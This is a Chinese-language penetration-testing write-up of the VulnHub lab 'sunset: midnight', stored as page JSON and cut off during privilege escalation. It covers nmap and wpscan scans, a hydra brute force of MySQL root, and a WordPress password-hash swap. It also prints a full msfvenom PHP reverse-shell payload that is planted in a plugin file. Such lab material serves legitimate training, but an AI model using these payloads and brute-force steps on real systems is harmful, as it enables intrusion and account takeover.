{"pageProps":{"postData":{"id":"Vulnhubsunset midnight","contentHtml":"<h1>sunset: midnight</h1>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/sunset-midnight,517/\">https://www.vulnhub.com/entry/sunset-midnight,517/</a></p>\n</blockquote>\n<h2>主机发现端口扫描</h2>\n<ol>\n<li>\n<p>探测存活主机，<code>8</code>是靶机</p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.0</span>/<span class=\"hljs-number\">24</span>                              \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-12-05 16:49 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00044</span>s latency).\nMAC Address: <span class=\"hljs-number\">0</span>A:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">14</span> (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00028</span>s latency).\nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">37</span>:A2:<span class=\"hljs-title function_ invoke__\">CB</span> (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.8</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00039</span>s latency).\nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:A6:DF:<span class=\"hljs-number\">28</span> (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.10</span>\n</code></pre>\n</li>\n<li>\n<p>扫描靶机所有开放端口</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.8</span>   \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-12-05 16:50 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> sunset-<span class=\"hljs-title function_ invoke__\">midnight</span> (<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.8</span>)\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.0012</span>s latency).\nNot shown: <span class=\"hljs-number\">65532</span> closed tcp <span class=\"hljs-title function_ invoke__\">ports</span> (conn-refused)\nPORT     STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp   open  ssh\n<span class=\"hljs-number\">80</span>/tcp   open  http\n<span class=\"hljs-number\">3306</span>/tcp open  mysql\nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:A6:DF:<span class=\"hljs-number\">28</span> (Oracle VirtualBox virtual NIC)\n</code></pre>\n</li>\n<li>\n<p>扫描服务版本及系统版本</p>\n<pre><code class=\"hljs language-php\">nmap -sV -sT -O -p <span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">3306</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.8</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-12-05 16:51 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> sunset-<span class=\"hljs-title function_ invoke__\">midnight</span> (<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.8</span>)\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00052</span>s latency).\n\nPORT     STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp   open  ssh     OpenSSH <span class=\"hljs-number\">7.9</span>p1 Debian <span class=\"hljs-number\">10</span>+<span class=\"hljs-title function_ invoke__\">deb10u2</span> (protocol <span class=\"hljs-number\">2.0</span>)\n<span class=\"hljs-number\">80</span>/tcp   open  http    Apache httpd <span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">38</span> ((Debian))\n<span class=\"hljs-number\">3306</span>/tcp open  mysql   MySQL <span class=\"hljs-number\">5.5</span>.<span class=\"hljs-number\">5</span>-<span class=\"hljs-number\">10.3</span>.<span class=\"hljs-number\">22</span>-MariaDB-<span class=\"hljs-number\">0</span>+deb10u1\nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:A6:DF:<span class=\"hljs-number\">28</span> (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice type: general purpose\nRunning: Linux <span class=\"hljs-number\">4</span>.X|<span class=\"hljs-number\">5</span>.X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">5</span>\nOS details: Linux <span class=\"hljs-number\">4.15</span> - <span class=\"hljs-number\">5.8</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>\n</li>\n<li>\n<p>扫描漏洞</p>\n<pre><code class=\"hljs language-c\">nmap -script=vuln -p <span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">3306</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.8</span>                                                                                                                                                                  \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-12-05 16:51 CST                                                                                                                                                </span>\nNmap scan report <span class=\"hljs-keyword\">for</span> sunset-midnight (<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.8</span>)                                                      \nHost is up (<span class=\"hljs-number\">0.00042</span>s latency).                                                                           \n                                                                                                         \nPORT     STATE SERVICE                                                                                   \n<span class=\"hljs-number\">22</span>/tcp   open  ssh                                                                                       \n<span class=\"hljs-number\">80</span>/tcp   open  http     \n| http-wordpress-users:                                                                                                                                                                                           \n| Username found: admin                                                                                                                                                                                           \n|_Search stopped at ID #<span class=\"hljs-number\">25.</span> Increase the upper limit <span class=\"hljs-keyword\">if</span> necessary with <span class=\"hljs-string\">'http-wordpress-users.limit'</span>                                                                                                               \n|_http-stored-xss: Couldn<span class=\"hljs-string\">'t find any stored XSS vulnerabilities.                                                                                                                                                  \n|_http-dombased-xss: Couldn'</span>t find any DOM based XSS.                                                                                                                                                             \n| http-<span class=\"hljs-keyword\">enum</span>:                                                                                             \n|   /blog/: Blog                                                                                         \n|   /wp-login.php: Possible admin folder                                                                 \n|   /wp-json: Possible admin folder                                                                      \n|   /robots.txt: Robots file                                                                             \n|   /readme.html: Wordpress version: <span class=\"hljs-number\">2</span>                                                                   \n|   /: WordPress version: <span class=\"hljs-number\">5.4</span>.<span class=\"hljs-number\">2</span>                                                                                                                                                                                   \n|   /feed/: Wordpress version: <span class=\"hljs-number\">5.4</span>.<span class=\"hljs-number\">2</span>                                                                                                                                                                              \n|   /wp-includes/images/rss.png: Wordpress version <span class=\"hljs-number\">2.2</span> found.                                                                                                                                                     \n|   /wp-includes/js/jquery/suggest.js: Wordpress version <span class=\"hljs-number\">2.5</span> found.                                                                                                                                               \n|   /wp-includes/images/blank.gif: Wordpress version <span class=\"hljs-number\">2.6</span> found.                                                                                                                                                   \n|   /wp-includes/js/comment-reply.js: Wordpress version <span class=\"hljs-number\">2.7</span> found.                                                                                                                                                \n|   /wp-login.php: Wordpress login page.                                                                 \n|   /wp-admin/upgrade.php: Wordpress login page.                                                         \n|   /readme.html: Interesting, a readme.                                                                 \n|_  /contact/: Potentially interesting folder                                                                                                                                                                     \n<span class=\"hljs-number\">3306</span>/tcp open  mysql                                                                                                                                                                                              \n|_mysql-vuln-cve2012<span class=\"hljs-number\">-2122</span>: ERROR: Script execution failed (use -d to debug)                                                                                                                                       \nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:A6:DF:<span class=\"hljs-number\">28</span> (Oracle VirtualBox virtual NIC)     \n</code></pre>\n<p>靶机CMS是<code>wordpress</code> ，确定版本后可以查询公开漏洞进行利用</p>\n<p>并且扫出mysql可能存在<code>cve2012-2122</code></p>\n</li>\n</ol>\n<h2>web渗透</h2>\n<ol>\n<li>\n<p>知道CMS是<code>wordpress</code>，就用<code>wpscan</code>来扫一下</p>\n<pre><code class=\"hljs language-c\">wpscan --url http:<span class=\"hljs-comment\">//sunset-midnight/  </span>\n_______________________________________________________________  \n         __          _______   _____                            \n\t\t\t\t \\ \\        / /  __ \\ / ____|                                                                    \n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ ®           \n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | <span class=\"hljs-string\">'_ \\ \n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|                                                   \n                                                                                                         \n         WordPress Security Scanner by the WPScan Team                                                   \n                         Version 3.8.27                                                                  \n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart                          \n_______________________________________________________________                                          \n                                                                                                         \n[i] It seems like you have not updated the database for some time.                                       \n[?] Do you want to update now? [Y]es [N]o, default: [N]n                                                 \n[+] URL: http://sunset-midnight/ [192.168.56.8]                                                          \n[+] Started: Thu Dec  5 17:56:06 2024                                                                    \n                                                                                                         \nInteresting Finding(s):                                                                                  \n \n[+] Headers                                                                                              \n | Interesting Entry: Server: Apache/2.4.38 (Debian)  \n | Found By: Headers (Passive Detection)                                                                 \n | Confidence: 100%                                                                                      \n                                                                                                         \n[+] robots.txt found: http://sunset-midnight/robots.txt                                                  \n | Interesting Entries:                                                                                  \n |  - /wp-admin/                                                                                         \n |  - /wp-admin/admin-ajax.php                                                                           \n | Found By: Robots Txt (Aggressive Detection)                                                           \n | Confidence: 100%\n                                                    \n[+] XML-RPC seems to be enabled: http://sunset-midnight/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)                                                        \n | Confidence: 100%                                                                                      \n | References:                                                                     \n |  - http://codex.wordpress.org/XML-RPC_Pingback_API                                                    \n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/                  \n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/                         \n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\n                                                                                                          \n[+] WordPress readme found: http://sunset-midnight/readme.html   \n | Found By: Direct Access (Aggressive Detection)                                                        \n | Confidence: 100%                                                                                      \n                                                                                                         \n[+] Upload directory has listing enabled: http://sunset-midnight/wp-content/uploads/                     \n | Found By: Direct Access (Aggressive Detection)                                                        \n | Confidence: 100%                                                                                      \n                                                                                                         \n[+] The external WP-Cron seems to be enabled: http://sunset-midnight/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)                                                        \n | Confidence: 60%                                                                                       \n | References:                                                                                           \n |  - https://www.iplocation.net/defend-wordpress-from-ddos                                              \n |  - https://github.com/wpscanteam/wpscan/issues/1299                                                   \n                                                                                                         \n[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).                               \n | Found By: Rss Generator (Passive Detection)                                                           \n |  - http://sunset-midnight/feed/, &#x3C;generator>https://wordpress.org/?v=5.4.2&#x3C;/generator>              \n |  - http://sunset-midnight/comments/feed/, &#x3C;generator>https://wordpress.org/?v=5.4.2&#x3C;/generator>       \n                                                                                                         \n[+] WordPress theme in use: twentyseventeen                                                              \n | Location: http://sunset-midnight/wp-content/themes/twentyseventeen/                                   \n | Last Updated: 2024-07-16T00:00:00.000Z                                                                \n | Readme: http://sunset-midnight/wp-content/themes/twentyseventeen/readme.txt                           \n | [!] The version is out of date, the latest version is 3.7                                             \n | Style URL: http://sunset-midnight/wp-content/themes/twentyseventeen/style.css?ver=20190507            \n | Style Name: Twenty Seventeen                                                                          \n | Style URI: https://wordpress.org/themes/twentyseventeen/                                              \n | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...\n | Author: the WordPress team                       \n | Author URI: https://wordpress.org/                                                                    \n |                                                                                                       \n | Found By: Css Style In Homepage (Passive Detection)                                                   \n | Confirmed By: Css Style In 404 Page (Passive Detection)                                    \n |                                                                                                       \n | Version: 2.3 (80% confidence)                                                                         \n | Found By: Style (Passive Detection)                                                                   \n |  - http://sunset-midnight/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: '</span>Version: <span class=\"hljs-number\">2.3'</span>\n[+] Enumerating All Plugins (via Passive Methods)                                                        \n[+] Checking Plugin Versions (via Passive and Aggressive Methods)\n                                                                                                         \n[i] Plugin(s) Identified:                                                                                \n                                                                                                         \n[+] simply-poll-master                                                                                   \n | Location: http:<span class=\"hljs-comment\">//sunset-midnight/wp-content/plugins/simply-poll-master/                               </span>\n |                                                                                                       \n | Found By: Urls In Homepage (Passive Detection)                                                        \n | Confirmed By: Urls In <span class=\"hljs-number\">404</span> Page (Passive Detection)                           \n |                                                                                                       \n | Version: <span class=\"hljs-number\">1.5</span> (<span class=\"hljs-number\">100</span>% confidence)                                                                        \n | Found By: Readme - Stable Tag (Aggressive Detection)                                                  \n |  - http:<span class=\"hljs-comment\">//sunset-midnight/wp-content/plugins/simply-poll-master/readme.txt                            </span>\n | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)                                       \n |  - http:<span class=\"hljs-comment\">//sunset-midnight/wp-content/plugins/simply-poll-master/readme.txt                            </span>\n                                                                                                         \n[+] Enumerating Config Backups (via Passive and Aggressive Methods)                                      \n Checking Config Backups - Time: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">01</span> &#x3C;==========> (<span class=\"hljs-number\">137</span> / <span class=\"hljs-number\">137</span>) <span class=\"hljs-number\">100.00</span>% Time: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">01</span>\n                                                                                                         \n[i] No Config Backups Found.                                                                             \n                                                                                                         \n[!] No WPScan API Token given, as a result vulnerability data has not been output.                       \n[!] You can get a <span class=\"hljs-built_in\">free</span> API token with <span class=\"hljs-number\">25</span> daily requests by registering at https:<span class=\"hljs-comment\">//wpscan.com/register    </span>\n                                                                                                         \n[+] Finished: Thu Dec  <span class=\"hljs-number\">5</span> <span class=\"hljs-number\">17</span>:<span class=\"hljs-number\">56</span>:<span class=\"hljs-number\">14</span> <span class=\"hljs-number\">2024</span>                                                                   \n[+] Requests Done: <span class=\"hljs-number\">172</span>                                                                                   \n[+] Cached Requests: <span class=\"hljs-number\">7</span>                                                                                   \n[+] Data Sent: <span class=\"hljs-number\">43.472</span> KB                                                                                 \n[+] Data Received: <span class=\"hljs-number\">444.822</span> KB\n[+] Memory used: <span class=\"hljs-number\">331.578</span> MB                         \n[+] Elapsed time: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">08</span>  \n</code></pre>\n<p>版本为<code>version 5.4.2</code> ，模板用的是<code>twentyseventeen</code> ，没扫到插件</p>\n</li>\n<li>\n<p>网上没找到什么漏洞可以利用的</p>\n</li>\n</ol>\n<h2>cve2012-2122</h2>\n<ol>\n<li>\n<p>上边<code>nmap</code>扫描出可能存在<code>cve2012-2122</code> ，我们尝试利用</p>\n<pre><code class=\"hljs language-c\">msf6 > search <span class=\"hljs-number\">2012</span><span class=\"hljs-number\">-2122</span> \nmsf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(multi/handler)</span> > use 0 \nmsf6 <span class=\"hljs-title function_\">auxiliary</span><span class=\"hljs-params\">(scanner/mysql/mysql_authbypass_hashdump)</span> > <span class=\"hljs-built_in\">set</span> rhosts 192.168.56.8\nrhosts => <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.8</span>                              \nmsf6 <span class=\"hljs-title function_\">auxiliary</span><span class=\"hljs-params\">(scanner/mysql/mysql_authbypass_hashdump)</span> > run                                            \n\n[+] 192.168.56.8:3306     - 192.168.56.8:3306 The server allows logins, proceeding with bypass test      \n[*] 192.168.56.8:3306     - 192.168.56.8:3306 Authentication bypass is 10% complete                      \n[*] 192.168.56.8:3306     - 192.168.56.8:3306 Authentication bypass is 20% complete                      \n[*] 192.168.56.8:3306     - 192.168.56.8:3306 Authentication bypass is 30% complete                      \n[*] 192.168.56.8:3306     - 192.168.56.8:3306 Authentication bypass is 40% complete                      \n[*] 192.168.56.8:3306     - 192.168.56.8:3306 Authentication bypass is 50% complete                      \n[*] 192.168.56.8:3306     - 192.168.56.8:3306 Authentication bypass is 60% complete                      \n[*] 192.168.56.8:3306     - 192.168.56.8:3306 Authentication bypass is 70% complete                      \n[*] 192.168.56.8:3306     - 192.168.56.8:3306 Authentication bypass is 80% complete                      \n[*] 192.168.56.8:3306     - 192.168.56.8:3306 Authentication bypass is 90% complete                      \n[*] 192.168.56.8:3306     - 192.168.56.8:3306 Authentication bypass is 100% complete                     \n[-] 192.168.56.8:3306     - 192.168.56.8:3306 Unable to bypass authentication, this target may not be vulnerable\n[*] 192.168.56.8:3306     - Scanned 1 of 1 <span class=\"hljs-title function_\">hosts</span> <span class=\"hljs-params\">(<span class=\"hljs-number\">100</span>% complete)</span>                                         \n[*] Auxiliary module execution completed\n</code></pre>\n<p>但是没有利用成功</p>\n</li>\n</ol>\n<h2>暴力破解</h2>\n<ol>\n<li>\n<p>没有思路了，可以尝试下暴力破解，<code>wordpress</code>我们枚举出了<code>admin</code>用户，<code>mysql</code>我们尝试破解<code>root</code>用户，同时进行破解</p>\n</li>\n<li>\n<p>暴力破解<code>wordpress</code></p>\n<pre><code class=\"hljs language-c\">wpscan --url http:<span class=\"hljs-comment\">//sunset-midnight/ -U admin --passwords /usr/share/wordlists/rockyou.txt</span>\n</code></pre>\n</li>\n<li>\n<p>暴力破解<code>mysql</code></p>\n<pre><code class=\"hljs language-c\">hydra -l root -P /usr/share/wordlists/rockyou.txt <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.8</span> mysql\n</code></pre>\n</li>\n<li>\n<p>很快就爆破出了<code>mysql</code>的密码</p>\n<pre><code class=\"hljs language-c\">hydra -l root -P /usr/share/wordlists/rockyou.txt <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.8</span> mysql\nHydra v9.<span class=\"hljs-number\">5</span> (c) <span class=\"hljs-number\">2023</span> by van Hauser/THC &#x26; David Maciejak - Please <span class=\"hljs-keyword\">do</span> not use in military or secret service organizations, or <span class=\"hljs-keyword\">for</span> illegal <span class=\"hljs-title function_\">purposes</span> <span class=\"hljs-params\">(this is non-binding, these *** ignore laws and ethics anyway)</span>.\n\n<span class=\"hljs-title function_\">Hydra</span> <span class=\"hljs-params\">(https:<span class=\"hljs-comment\">//github.com/vanhauser-thc/thc-hydra) starting at 2024-12-05 23:13:16</span>\n[INFO] Reduced number of tasks to <span class=\"hljs-number\">4</span> (mysql does not like many parallel connections)\n[DATA] max <span class=\"hljs-number\">4</span> tasks per <span class=\"hljs-number\">1</span> server, overall <span class=\"hljs-number\">4</span> tasks, <span class=\"hljs-number\">14344399</span> login tries (l:<span class=\"hljs-number\">1</span>/p:<span class=\"hljs-number\">14344399</span>), ~<span class=\"hljs-number\">3586100</span> tries per task\n[DATA] attacking mysql:<span class=\"hljs-comment\">//192.168.56.8:3306/</span>\n[<span class=\"hljs-number\">3306</span>][mysql] host: <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.8</span>   login: root   password: robert\n<span class=\"hljs-number\">1</span> of <span class=\"hljs-number\">1</span> target successfully completed, <span class=\"hljs-number\">1</span> valid password found\nHydra (https:<span class=\"hljs-comment\">//github.com/vanhauser-thc/thc-hydra) finished at 2024-12-05 23:13:21</span>\n</span></code></pre>\n<p>密码是<code>robert</code></p>\n</li>\n</ol>\n<h2>数据库寻找敏感信息</h2>\n<ol>\n<li>\n<p>利用<code>Navicat</code>登录<code>mysql</code> ，寻找<code>WP</code>的用户表</p>\n<p><img src=\"/post-images/Vulnhubsunset%20midnight/image103.png\" alt=\"image.png\"></p>\n<p>发现密码，不过是加密的</p>\n</li>\n<li>\n<p>通过<code>hash-identifier</code> 识别</p>\n<pre><code class=\"hljs language-c\">hash-identifier     \n   #########################################################################\n   #     __  __                     __           ______    _____           #  \n   #    /\\ \\/\\ \\                   /\\ \\         /\\__  _\\  /\\  _ `\\         #\n   #    \\ \\ \\_\\ \\     __      ____ \\ \\ \\___     \\/_/\\ \\/  \\ \\ \\/\\ \\        #\n   #     \\ \\  _  \\  /<span class=\"hljs-string\">'__`\\   / ,__\\ \\ \\  _ `\\      \\ \\ \\   \\ \\ \\ \\ \\       #\n   #      \\ \\ \\ \\ \\/\\ \\_\\ \\_/\\__, `\\ \\ \\ \\ \\ \\      \\_\\ \\__ \\ \\ \\_\\ \\      #\n   #       \\ \\_\\ \\_\\ \\___ \\_\\/\\____/  \\ \\_\\ \\_\\     /\\_____\\ \\ \\____/      #\n   #        \\/_/\\/_/\\/__/\\/_/\\/___/    \\/_/\\/_/     \\/_____/  \\/___/  v1.2 #\n   #                                                             By Zion3R #\n   #                                                    www.Blackploit.com #\n   #                                                   Root@Blackploit.com #\n   #########################################################################\n--------------------------------------------------\n HASH: $P$BaWk4oeAmrdn453hR6O6BvDqoF9yy6/ \n\nPossible Hashs:\n[+] MD5(Wordpress)\n</span></code></pre>\n</li>\n<li>\n<p>尝试破解没破解出来</p>\n</li>\n<li>\n<p>创建了一个<code>MD5</code>替换上去即可</p>\n<p>下边是<code>123456</code>的<code>MD5</code>值，将其替换上去</p>\n<pre><code class=\"hljs language-c\">e10adc3949ba59abbe56e057f20f883e\n</code></pre>\n<p><img src=\"/post-images/Vulnhubsunset%20midnight/image104.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>尝试登陆WP后台</p>\n</li>\n</ol>\n<h2>后台getshell</h2>\n<ol>\n<li>\n<p>尝试登录<code>WP</code>后台，密码是上边替换上去的<code>123456</code></p>\n<p><img src=\"/post-images/Vulnhubsunset%20midnight/image105.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>在 <code>Plugins</code> → <code>Plugin Editor</code> 的右上角的<code>Select plugin to edit</code> 选择<code>Simply Poll</code> 然后<code>select</code></p>\n<p><img src=\"/post-images/Vulnhubsunset%20midnight/image106.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>然后选择<code>simply-poll.php</code> 进行修改，写入<code>phpinfo</code>进行测试</p>\n<p><img src=\"/post-images/Vulnhubsunset%20midnight/image107.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>路径为 <code>/wp-content/plugins/simply-poll-master/simply-poll.php</code> ，访问</p>\n<p><img src=\"/post-images/Vulnhubsunset%20midnight/image108.png\" alt=\"image.png\"></p>\n<p>测试成功</p>\n</li>\n<li>\n<p>直接上线<code>MSF</code> (<code>.10</code>为<code>kali IP</code>)</p>\n<pre><code class=\"hljs language-c\">msf6 > use exploit/multi/handler\nmsf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(multi/handler)</span> > <span class=\"hljs-built_in\">set</span> payload php/meterpreter/reverse_tcp\nmsf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(multi/handler)</span> > <span class=\"hljs-built_in\">set</span> lhost 192.168.56.10\nmsf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(multi/handler)</span> > <span class=\"hljs-built_in\">set</span> lport 1234\nmsf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(multi/handler)</span> > run\n</code></pre>\n<p>然后再<code>msfvenom</code>生成<code>payload</code> ，然后将代码写入到上边的<code>simply-poll.php</code></p>\n<pre><code class=\"hljs language-c\">msfvenom -p php/meterpreter/reverse_tcp lhost=<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.10</span> lport=<span class=\"hljs-number\">1234</span> -f raw            \n[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload\n[-] No arch selected, selecting arch: php from the payload\nNo encoder specified, outputting raw payload\nPayload size: <span class=\"hljs-number\">1114</span> bytes\n\n<span class=\"hljs-comment\">/*&#x3C;?php /**/</span> error_reporting(<span class=\"hljs-number\">0</span>); $ip = <span class=\"hljs-string\">'192.168.56.10'</span>; $port = <span class=\"hljs-number\">1234</span>; <span class=\"hljs-keyword\">if</span> (($f = <span class=\"hljs-string\">'stream_socket_client'</span>) &#x26;&#x26; is_callable($f)) { $s = $f(<span class=\"hljs-string\">\"tcp://{$ip}:{$port}\"</span>); $s_type = <span class=\"hljs-string\">'stream'</span>; } <span class=\"hljs-keyword\">if</span> (!$s &#x26;&#x26; ($f = <span class=\"hljs-string\">'fsockopen'</span>) &#x26;&#x26; is_callable($f)) { $s = $f($ip, $port); $s_type = <span class=\"hljs-string\">'stream'</span>; } <span class=\"hljs-keyword\">if</span> (!$s &#x26;&#x26; ($f = <span class=\"hljs-string\">'socket_create'</span>) &#x26;&#x26; is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); <span class=\"hljs-keyword\">if</span> (!$res) { die(); } $s_type = <span class=\"hljs-string\">'socket'</span>; } <span class=\"hljs-keyword\">if</span> (!$s_type) { die(<span class=\"hljs-string\">'no socket funcs'</span>); } <span class=\"hljs-keyword\">if</span> (!$s) { die(<span class=\"hljs-string\">'no socket'</span>); } <span class=\"hljs-keyword\">switch</span> ($s_type) { <span class=\"hljs-keyword\">case</span> <span class=\"hljs-string\">'stream'</span>: $len = fread($s, <span class=\"hljs-number\">4</span>); <span class=\"hljs-keyword\">break</span>; <span class=\"hljs-keyword\">case</span> <span class=\"hljs-string\">'socket'</span>: $len = socket_read($s, <span class=\"hljs-number\">4</span>); <span class=\"hljs-keyword\">break</span>; } <span class=\"hljs-keyword\">if</span> (!$len) { die(); } $a = unpack(<span class=\"hljs-string\">\"Nlen\"</span>, $len); $len = $a[<span class=\"hljs-string\">'len'</span>]; $b = <span class=\"hljs-string\">''; while (strlen($b) &#x3C; $len) { switch ($s_type) { case '</span>stream<span class=\"hljs-string\">': $b .= fread($s, $len-strlen($b)); break; case '</span>socket<span class=\"hljs-string\">': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['</span>msgsock<span class=\"hljs-string\">'] = $s; $GLOBALS['</span>msgsock_type<span class=\"hljs-string\">'] = $s_type; if (extension_loaded('</span>suhosin<span class=\"hljs-string\">') &#x26;&#x26; ini_get('</span>suhosin.executor.disable_eval<span class=\"hljs-string\">')) { $suhosin_bypass=create_function('</span><span class=\"hljs-string\">', $b); $suhosin_bypass(); } else { eval($b); } die();\n</span></code></pre>\n<p><img src=\"/post-images/Vulnhubsunset%20midnight/image109.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>然后再次访问<code>/wp-content/plugins/simply-poll-master/simply-poll.php</code> MSF获取到<code>shell</code></p>\n<pre><code class=\"hljs language-c\">msf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(multi/handler)</span> > run\n\n[*] Started reverse TCP handler on 192.168.56.10:1234 \n[*] Sending <span class=\"hljs-title function_\">stage</span> <span class=\"hljs-params\">(<span class=\"hljs-number\">39927</span> bytes)</span> to 192.168.56.8\n[*] Meterpreter session 1 <span class=\"hljs-title function_\">opened</span> <span class=\"hljs-params\">(<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.10</span>:<span class=\"hljs-number\">1234</span> -> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.8</span>:<span class=\"hljs-number\">50890</span>)</span> at 2024-12-05 23:59:21 +0800\n\nmeterpreter > \n</code></pre>\n</li>\n</ol>\n<h2>提权</h2>\n<ol>\n<li>\n<p>查看权限</p>\n<pre><code class=\"hljs language-c\">meterpreter > sysinfo\nComputer    : midnight\nOS          : Linux midnight <span class=\"hljs-number\">4.19</span>.<span class=\"hljs-number\">0</span><span class=\"hljs-number\">-9</span>-amd64 #<span class=\"hljs-number\">1</span> SMP Debian <span class=\"hljs-number\">4.19</span>.<span class=\"hljs-number\">118</span><span class=\"hljs-number\">-2</span>+deb10u1 (<span class=\"hljs-number\">2020</span><span class=\"hljs-number\">-06</span><span class=\"hljs-number\">-07</span>) x86_64\nMeterpreter : php/linux\n\nmeterpreter > getuid\nServer username: www-data\n\n$ ip add\nip add\n<span class=\"hljs-number\">1</span>: lo: &#x3C;LOOPBACK,UP,LOWER_UP> mtu <span class=\"hljs-number\">65536</span> qdisc noqueue state UNKNOWN group <span class=\"hljs-keyword\">default</span> qlen <span class=\"hljs-number\">1000</span>\n    link/loopback <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span 